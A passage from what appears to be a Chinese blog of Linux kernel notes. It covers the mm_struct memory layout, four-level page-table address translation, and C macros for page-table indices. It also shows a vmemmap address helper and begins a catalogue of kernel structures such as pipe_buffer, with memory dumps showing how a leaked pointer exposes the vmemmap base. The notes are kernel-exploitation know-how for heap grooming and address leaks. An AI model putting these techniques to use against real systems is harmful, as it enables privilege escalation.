</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |     8 */</span>            <span class="kt">atomic_long_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  136      |     8 */</span>            <span class="kt">atomic_long_t</span> <span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |     4 */</span>            <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |     4 */</span>                <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  148      |     4 */</span>            <span class="kt">raw_spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  152      |    16 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  152      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  160      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">mmap_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  176      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">mmlist</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  184      |     4 */</span>        <span class="kt">int</span> <span class="n">mm_lock_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  192      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">hiwater_rss</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  200      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">hiwater_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  208      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">total_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  216      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">locked_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  224      |     8 */</span>        <span class="kt">atomic64_t</span> <span class="n">pinned_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  232      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">data_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  240      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">exec_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  248      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  256      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">def_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  264      |     4 */</span>        <span class="kt">seqcount_t</span> <span class="n">write_protect_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  268      |     4 */</span>        <span class="kt">spinlock_t</span> <span class="n">arg_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  272      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start_code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  280      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">end_code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  288      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  296      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">end_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  304      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start_brk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  312      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">brk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  320      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start_stack</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  328      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  336      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg_end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  344      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">env_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  352      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">env_end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  360      |   416 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">saved_auxv</span><span class="p">[</span><span class="mi">52</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  776      |   160 */</span>        <span class="k">struct</span> <span class="n">percpu_counter</span> <span class="n">rss_stat</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  936      |     8 */</span>        <span class="k">struct</span> <span class="n">linux_binfmt</span> <span class="o">*</span><span class="n">binfmt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  944      |   128 */</span>        <span class="kt">mm_context_t</span> <span class="n">context</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1072      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1080      |     4 */</span>        <span class="kt">spinlock_t</span> <span class="n">ioctx_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1088      |     8 */</span>        <span class="k">struct</span> <span class="n">kioctx_table</span> <span class="o">*</span><span class="n">ioctx_table</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1096      |     8 */</span>        <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1104      |     8 */</span>        <span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">user_ns</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1112      |     8 */</span>        <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">exe_file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1120      |     8 */</span>        <span class="k">struct</span> <span class="n">mmu_notifier_subscriptions</span> <span class="o">*</span><span class="n">notifier_subscriptions</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1128      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">numa_next_scan</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1136      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">numa_scan_offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1144      |     4 */</span>        <span class="kt">int</span> <span class="n">numa_scan_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1148      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">tlb_flush_pending</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1152      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">tlb_flush_batched</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1160      |     8 */</span>        <span class="k">struct</span> <span class="n">uprobes_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1160      |     8 */</span>            <span class="k">struct</span> <span class="n">xol_area</span> <span class="o">*</span><span class="n">xol_area</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">uprobes_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1168      |     8 */</span>        <span class="kt">atomic_long_t</span> <span class="n">hugetlb_usage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1176      |    32 */</span>        <span class="k">struct</span> <span class="n">work_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1176      |     8 */</span>            <span class="kt">atomic_long_t</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1184      |    16 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1184      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1192      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1200      |     8 */</span>            <span class="kt">work_func_t</span> <span class="n">func</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">async_put_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1208      |     4 */</span>        <span class="n">u32</span> <span class="n">pasid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1216      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ksm_merging_pages</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1224      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ksm_rmap_items</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes): 1232 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1232      |     0 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cpu_bitmap</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                           <span class="cm">/* total size (bytes): 1232 */</span>
</span></span><span class="line"><span class="cl">                         <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="图形表示">图形表示</h3>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231109093641811.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231109093641811.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231109093641811.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231109093641811.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231109093641811.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231109093641811.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">┌────────┬────────┬────────┬────────┬────────┬────────┬────────┬────────┐</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span><span class="mf">63.</span><span class="p">..</span><span class="mf">.56</span><span class="err">│</span><span class="mf">55.</span><span class="p">..</span><span class="mf">.48</span><span class="err">│</span><span class="mf">47.</span><span class="p">..</span><span class="mf">.40</span><span class="err">│</span><span class="mf">39.</span><span class="p">..</span><span class="mf">.32</span><span class="err">│</span><span class="mf">31.</span><span class="p">..</span><span class="mf">.24</span><span class="err">│</span><span class="mf">23.</span><span class="p">..</span><span class="mf">.16</span><span class="err">│</span><span class="mf">15.</span><span class="p">...</span><span class="mf">.8</span><span class="err">│</span><span class="mf">7.</span><span class="p">....</span><span class="mf">.0</span><span class="err">│</span>
</span></span><span class="line"><span class="cl"><span class="err">└┬───────┴────────┴┬───────┴─┬──────┴──┬─────┴───┬────┴────┬───┴────────┘</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>         <span class="err">▼</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>   <span class="p">[</span><span class="mi">11</span><span class="o">:</span><span class="mi">0</span><span class="p">]</span> <span class="n">Direct</span> <span class="n">translation</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>         <span class="err">└─►</span> <span class="p">[</span><span class="mi">20</span><span class="o">:</span><span class="mi">12</span><span class="p">]</span> <span class="n">PTE</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">│</span>         <span class="err">│</span>         <span class="err">│</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">│</span>         <span class="err">│</span>         <span class="err">└───────────►</span> <span class="p">[</span><span class="mi">29</span><span class="o">:</span><span class="mi">21</span><span class="p">]</span> <span class="n">PMD</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">│</span>         <span class="err">│</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">│</span>         <span class="err">└─────────────────────►</span> <span class="p">[</span><span class="mi">38</span><span class="o">:</span><span class="mi">30</span><span class="p">]</span> <span class="n">PUD</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">│</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>                 <span class="err">└───────────────────────────────►</span> <span class="p">[</span><span class="mi">47</span><span class="o">:</span><span class="mi">39</span><span class="p">]</span> <span class="n">PGD</span>
</span></span><span class="line"><span class="cl"> <span class="err">│</span>
</span></span><span class="line"><span class="cl"> <span class="err">└─────────────────────────────────────────────────►</span> <span class="p">[</span><span class="mi">63</span><span class="p">]</span> <span class="n">Reserved</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">Example</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="nl">Address</span><span class="p">:</span> <span class="mh">0x0000555555554020</span>
</span></span><span class="line"><span class="cl">                   <span class="err">│</span>
</span></span><span class="line"><span class="cl">                   <span class="err">│</span>
</span></span><span class="line"><span class="cl">                   <span class="err">▼</span>
</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="n">b0000000000000000010101010101010101010101010101010100000000100000</span>
</span></span><span class="line"><span class="cl">              <span class="p">[</span>   <span class="n">RESERVED</span>   <span class="p">][</span>  <span class="n">PGD</span>  <span class="p">][</span>  <span class="n">PUD</span>  <span class="p">][</span>  <span class="n">PMD</span>  <span class="p">][</span>  <span class="n">PTE</span>  <span class="p">][</span>  <span class="n">OFFSET</span>  <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="nl">PGD</span><span class="p">:</span>    <span class="mo">010101010</span> <span class="o">=</span> <span class="mi">170</span>
</span></span><span class="line"><span class="cl"> <span class="nl">PUD</span><span class="p">:</span>    <span class="mi">101010101</span> <span class="o">=</span> <span class="mi">341</span>
</span></span><span class="line"><span class="cl"> <span class="nl">PMD</span><span class="p">:</span>    <span class="mo">010101010</span> <span class="o">=</span> <span class="mi">170</span>
</span></span><span class="line"><span class="cl"> <span class="nl">PTE</span><span class="p">:</span>    <span class="mi">101010100</span> <span class="o">=</span> <span class="mi">340</span>
</span></span><span class="line"><span class="cl"> <span class="n">D</span><span class="o">-</span><span class="nl">T</span><span class="p">:</span> <span class="mo">000000100000</span> <span class="o">=</span>  <span class="mi">32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       <span class="n">PGD</span>                <span class="n">PUD</span>                <span class="n">PMD</span>                <span class="n">PTE</span>              <span class="n">P</span><span class="o">-</span><span class="n">MEM</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="err">┌────────┐</span>         <span class="err">┌────────┐</span>         <span class="err">┌────────┐</span>         <span class="err">┌────────┐</span>        <span class="err">┌──────────┐</span>
</span></span><span class="line"><span class="cl">  <span class="mi">0</span> <span class="err">│</span>        <span class="err">│</span>  <span class="err">┌───►</span><span class="mi">0</span> <span class="err">│</span>        <span class="err">│</span>  <span class="err">┌───►</span><span class="mi">0</span> <span class="err">│</span>        <span class="err">│</span>  <span class="err">┌───►</span><span class="mi">0</span> <span class="err">│</span>        <span class="err">│</span>  <span class="err">┌──►</span><span class="mi">0</span> <span class="err">│</span>          <span class="err">│</span>
</span></span><span class="line"><span class="cl">    <span class="err">├────────┤</span>  <span class="err">│</span>      <span class="err">├────────┤</span>  <span class="err">│</span>      <span class="err">├────────┤</span>  <span class="err">│</span>      <span class="err">├────────┤</span>  <span class="err">│</span>     <span class="err">├──────────┤</span>
</span></span><span class="line"><span class="cl">    <span class="err">│</span>        <span class="err">│</span>  <span class="err">│</span>      <span class="err">│</span>        <span class="err">│</span>  <span class="err">│</span>      <span class="err">│</span>        <span class="err">│</span>  <span class="err">│</span>      <span class="err">│</span>        <span class="err">│</span>  <span class="err">│</span>  <span class="mi">32</span> <span class="err">│</span> <span class="n">Hello_Wo</span> <span class="err">│</span>
</span></span><span class="line"><span class="cl">    <span class="err">├────────┤</span>  <span class="err">│</span>      <span class="err">├────────┤</span>  <span class="err">│</span>      <span class="err">├────────┤</span>  <span class="err">│</span>      <span class="err">├────────┤</span>  <span class="err">│</span>     <span class="err">├──────────┤</span>
</span></span><span class="line"><span class="cl"><span class="mi">170</span> <span class="err">│</span>        <span class="err">├──┘</span>      <span class="err">│</span>        <span class="err">│</span>  <span class="err">│</span>  <span class="mi">170</span> <span class="err">│</span>        <span class="err">├──┘</span>      <span class="err">│</span>        <span class="err">│</span>  <span class="err">│</span>     <span class="err">│</span> <span class="n">rld</span><span class="o">!</span><span class="mo">0000</span> <span class="err">│</span>
</span></span><span class="line"><span class="cl">    <span class="err">├────────┤</span>         <span class="err">├────────┤</span>  <span class="err">│</span>      <span class="err">├────────┤</span>         <span class="err">├────────┤</span>  <span class="err">│</span>     <span class="err">├──────────┤</span>
</span></span><span class="line"><span class="cl">    <span class="err">│</span>        <span class="err">│</span>     <span class="mi">341</span> <span class="err">│</span>        <span class="err">├──┘</span>      <span class="err">│</span>        <span class="err">│</span>     <span class="mi">340</span> <span class="err">│</span>        <span class="err">├──┘</span>     <span class="err">│</span>          <span class="err">│</span>
</span></span><span class="line"><span class="cl">    <span class="err">├────────┤</span>         <span class="err">├────────┤</span>         <span class="err">├────────┤</span>         <span class="err">├────────┤</span>        <span class="err">├──────────┤</span>
</span></span><span class="line"><span class="cl"><span class="mi">512</span> <span class="err">│</span>        <span class="err">│</span>     <span class="mi">512</span> <span class="err">│</span>        <span class="err">│</span>     <span class="mi">512</span> <span class="err">│</span>        <span class="err">│</span>     <span class="mi">512</span> <span class="err">│</span>        <span class="err">│</span>   <span class="mi">4096</span> <span class="err">│</span>          <span class="err">│</span>
</span></span><span class="line"><span class="cl">    <span class="err">└────────┘</span>         <span class="err">└────────┘</span>         <span class="err">└────────┘</span>         <span class="err">└────────┘</span>        <span class="err">└──────────┘</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="代码表示">代码表示</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define PTE_OFFSET 12
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_OFFSET 21
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_OFFSET 30
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_OFFSET 39
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PT_ENTRY_MASK 0b111111111UL
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PTE_ENTRY(addr) ((addr &gt;&gt; 12) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_ENTRY(addr) ((addr &gt;&gt; 21) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_ENTRY(addr) ((addr &gt;&gt; 30) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_ENTRY(addr) ((addr &gt;&gt; 39) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ENTRY(addr) ((addr) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ATTR_RW (1UL &lt;&lt; 1)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ATTR_NX (1UL &lt;&lt; 63)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">dirt</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(((</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span> <span class="o">-</span> <span class="n">page_offset_base</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">vmemmap_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="内核常用结构体">内核常用结构体</h2>
<h3 id="gfp_kernel_account">GFP_KERNEL_ACCOUNT</h3>
<h4 id="pipe_buffer--kmalloc-cg-0x40">pipe_buffer (&gt; kmalloc-cg-0x40)</h4>
<p>默认 0x28*0x10 = 0x280</p>
<p>write 的时候更改(pipe_buffer + 0x8 + 0x4)</p>
<p>read 的时候更改(pipe_buffer + 0x8) 同时会减小 pipe_buffer + 0x8 + 0x4</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">write<span class="o">(</span>pipes<span class="o">[</span>1<span class="o">]</span>,buf,0x100<span class="o">)</span>
</span></span><span class="line"><span class="cl">0xffff88800f9aa000:	0xffffea00003e5d80	0x0000010000000000
</span></span><span class="line"><span class="cl">0xffff88800f9aa010:	0xffffffff82246ec0	0x0000000000000010
</span></span><span class="line"><span class="cl">0xffff88800f9aa020:	0x0000000000000000
</span></span><span class="line"><span class="cl">read<span class="o">(</span>pipes<span class="o">[</span>0<span class="o">]</span>,buf,0x10<span class="o">)</span>
</span></span><span class="line"><span class="cl">0xffff8880081aa000:	0xffffea00003e5d80	0x000000f000000010
</span></span><span class="line"><span class="cl">0xffff8880081aa010:	0xffffffff82246ec0	0x0000000000000010
</span></span><span class="line"><span class="cl">0xffff8880081aa020:	0x0000000000000000
</span></span><span class="line"><span class="cl">0xffffea00003e5d80 <span class="p">&amp;</span> <span class="nv">0xffffffffff000000</span> <span class="o">==</span> vmembase <span class="o">(</span>即page结构体的基地址<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
